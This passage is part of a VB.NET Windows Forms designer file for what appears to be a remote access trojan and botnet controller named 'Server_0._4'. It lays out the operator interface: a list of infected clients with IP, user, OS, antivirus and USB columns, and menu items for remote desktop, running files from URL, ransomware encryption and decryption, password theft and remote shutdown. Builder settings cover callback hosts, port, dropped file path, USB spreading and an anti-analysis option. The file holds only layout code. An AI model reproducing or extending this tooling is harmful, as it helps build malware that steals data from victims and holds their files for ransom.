        Me.Label3.AutoSize = True
        Me.Label3.ForeColor = System.Drawing.Color.Lime
        Me.Label3.Location = New System.Drawing.Point(16, 98)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(90, 18)
        Me.Label3.TabIndex = 3
        Me.Label3.Text = "File Name"
        '
        'EXE
        '
        Me.EXE.BackColor = System.Drawing.Color.Transparent
        Me.EXE.Colors = New Server_0._4.Bloom(-1) {}
        Me.EXE.Customization = ""
        Me.EXE.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Server_0._4.My.MySettings.Default, "exe", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me.EXE.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.EXE.Image = Nothing
        Me.EXE.Location = New System.Drawing.Point(112, 91)
        Me.EXE.MaxCharacters = 0
        Me.EXE.Name = "EXE"
        Me.EXE.NoRounding = False
        Me.EXE.Size = New System.Drawing.Size(240, 25)
        Me.EXE.TabIndex = 2
        Me.EXE.Text = Global.Server_0._4.My.MySettings.Default.exe
        Me.EXE.Transparent = True
        Me.EXE.UsePasswordMask = False
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.ForeColor = System.Drawing.Color.Lime
        Me.Label4.Location = New System.Drawing.Point(16, 144)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(81, 18)
        Me.Label4.TabIndex = 1
        Me.Label4.Text = "Directory"
        '
        'ChGroupBox1
        '
        Me.ChGroupBox1.BackColor = System.Drawing.Color.Black
        Me.ChGroupBox1.BorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.ChGroupBox1.Controls.Add(Me.Label6)
        Me.ChGroupBox1.Controls.Add(Me.HOST2)
        Me.ChGroupBox1.Controls.Add(Me.Label2)
        Me.ChGroupBox1.Controls.Add(Me.PORT)
        Me.ChGroupBox1.Controls.Add(Me.Label1)
        Me.ChGroupBox1.Controls.Add(Me.HOST1)
        Me.ChGroupBox1.Customization = "AGQA/wAAAP8A/wD/"
        Me.ChGroupBox1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChGroupBox1.Image = Nothing
        Me.ChGroupBox1.Location = New System.Drawing.Point(25, 20)
        Me.ChGroupBox1.Movable = True
        Me.ChGroupBox1.Name = "ChGroupBox1"
        Me.ChGroupBox1.NoRounding = False
        Me.ChGroupBox1.Sizable = True
        Me.ChGroupBox1.Size = New System.Drawing.Size(371, 241)
        Me.ChGroupBox1.SmartBounds = True
        Me.ChGroupBox1.StartPosition = System.Windows.Forms.FormStartPosition.Manual
        Me.ChGroupBox1.TabIndex = 4
        Me.ChGroupBox1.Text = "Connection"
        Me.ChGroupBox1.TransparencyKey = System.Drawing.Color.Empty
        Me.ChGroupBox1.Transparent = False
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.ForeColor = System.Drawing.Color.Lime
        Me.Label6.Location = New System.Drawing.Point(17, 110)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(41, 18)
        Me.Label6.TabIndex = 5
        Me.Label6.Text = "IP 2"
        '
        'HOST2
        '
        Me.HOST2.BackColor = System.Drawing.Color.Transparent
        Me.HOST2.Colors = New Server_0._4.Bloom(-1) {}
        Me.HOST2.Customization = ""
        Me.HOST2.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Server_0._4.My.MySettings.Default, "host2", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me.HOST2.Font = New System.Drawing.Font("Verdana", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.HOST2.Image = Nothing
        Me.HOST2.Location = New System.Drawing.Point(85, 103)
        Me.HOST2.MaxCharacters = 0
        Me.HOST2.Name = "HOST2"
        Me.HOST2.NoRounding = False
        Me.HOST2.Size = New System.Drawing.Size(268, 25)
        Me.HOST2.TabIndex = 4
        Me.HOST2.Text = Global.Server_0._4.My.MySettings.Default.host2
        Me.HOST2.Transparent = True
        Me.HOST2.UsePasswordMask = False
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.ForeColor = System.Drawing.Color.Lime
        Me.Label2.Location = New System.Drawing.Point(16, 155)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(52, 18)
        Me.Label2.TabIndex = 3
        Me.Label2.Text = "PORT"
        '
        'PORT
        '
        Me.PORT.BackColor = System.Drawing.Color.Transparent
        Me.PORT.Colors = New Server_0._4.Bloom(-1) {}
        Me.PORT.Customization = ""
        Me.PORT.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.PORT.Image = Nothing
        Me.PORT.Location = New System.Drawing.Point(84, 148)
        Me.PORT.MaxCharacters = 0
        Me.PORT.Name = "PORT"
        Me.PORT.NoRounding = False
        Me.PORT.Size = New System.Drawing.Size(124, 25)
        Me.PORT.TabIndex = 2
        Me.PORT.Transparent = True
        Me.PORT.UsePasswordMask = False
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.ForeColor = System.Drawing.Color.Lime
        Me.Label1.Location = New System.Drawing.Point(16, 62)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(41, 18)
        Me.Label1.TabIndex = 1
        Me.Label1.Text = "IP 1"
        '
        'HOST1
        '
        Me.HOST1.BackColor = System.Drawing.Color.Transparent
        Me.HOST1.Colors = New Server_0._4.Bloom(-1) {}
        Me.HOST1.Customization = ""
        Me.HOST1.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Server_0._4.My.MySettings.Default, "host", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me.HOST1.Font = New System.Drawing.Font("Verdana", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.HOST1.Image = Nothing
        Me.HOST1.Location = New System.Drawing.Point(84, 55)
        Me.HOST1.MaxCharacters = 0
        Me.HOST1.Name = "HOST1"
        Me.HOST1.NoRounding = False
        Me.HOST1.Size = New System.Drawing.Size(268, 25)
        Me.HOST1.TabIndex = 0
        Me.HOST1.Text = Global.Server_0._4.My.MySettings.Default.host
        Me.HOST1.Transparent = True
        Me.HOST1.UsePasswordMask = False
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(1549, 515)
        Me.Controls.Add(Me.MAIN_TAB)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.Text = "Form1"
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.MAIN_TAB.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage3.ResumeLayout(False)
        Me.ChGroupBox3.ResumeLayout(False)
        Me.ChGroupBox2.ResumeLayout(False)
        Me.ChGroupBox2.PerformLayout()
        Me.ChGroupBox1.ResumeLayout(False)
        Me.ChGroupBox1.PerformLayout()
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents MAIN_TAB As CHTabcontrol
    Friend WithEvents TabPage1 As TabPage
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents L1 As ListView
    Friend WithEvents ID As ColumnHeader
    Friend WithEvents IP As ColumnHeader
    Friend WithEvents ContextMenuStrip1 As ContextMenuStrip
    Friend WithEvents RemoteDesktopToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents USER As ColumnHeader
    Friend WithEvents OS As ColumnHeader
    Friend WithEvents INDATE As ColumnHeader
    Friend WithEvents ControllerOptionsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UpdateToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DiskToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RunAFileToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FromDiskToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents Rans As ColumnHeader
    Friend WithEvents L2 As ListBox
    Friend WithEvents Timer1 As Timer
    Friend WithEvents StatusStrip1 As StatusStrip
    Friend WithEvents ToolStripStatusLabel1 As ToolStripStatusLabel
    Friend WithEvents RansomwareToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents EncryptToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DecryptionToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents NotifyIcon1 As NotifyIcon
    Friend WithEvents DetailsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PING As ColumnHeader
    Friend WithEvents VER As ColumnHeader
    Friend WithEvents EXE_NAME As ColumnHeader
    Friend WithEvents AboutToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PictureBox1 As PictureBox
    Friend WithEvents BotColorToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents BotPCOptionsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PCRestartToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PCShutdownToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PCLogoutToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents USB As ColumnHeader
    Friend WithEvents AV As ColumnHeader
    Friend WithEvents CheckFilesToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents TabPage3 As TabPage
    Friend WithEvents ChGroupBox1 As CHGroupBox
    Friend WithEvents Label6 As Label
    Friend WithEvents HOST2 As CHTextbox
    Friend WithEvents Label2 As Label
    Friend WithEvents PORT As CHTextbox
    Friend WithEvents Label1 As Label
    Friend WithEvents HOST1 As CHTextbox
    Friend WithEvents ChGroupBox2 As CHGroupBox
    Friend WithEvents DROP As CHOnOffBox
    Friend WithEvents PATH2 As CHTextbox
    Friend WithEvents Label5 As Label
    Friend WithEvents PATH1 As CHCombobox
    Friend WithEvents Label3 As Label
    Friend WithEvents EXE As CHTextbox
    Friend WithEvents Label4 As Label
    Friend WithEvents ChGroupBox3 As CHGroupBox
    Friend WithEvents ANTI As CHCheckbox
    Friend WithEvents USB_CHK As CHCheckbox
    Friend WithEvents ChButton1 As CHButton
    Friend WithEvents ChSeparator1 As CHSeparator
    Friend WithEvents ToolStripSeparator1 As ToolStripSeparator
    Friend WithEvents PasswordsToolStripMenuItem As ToolStripMenuItem
End Class
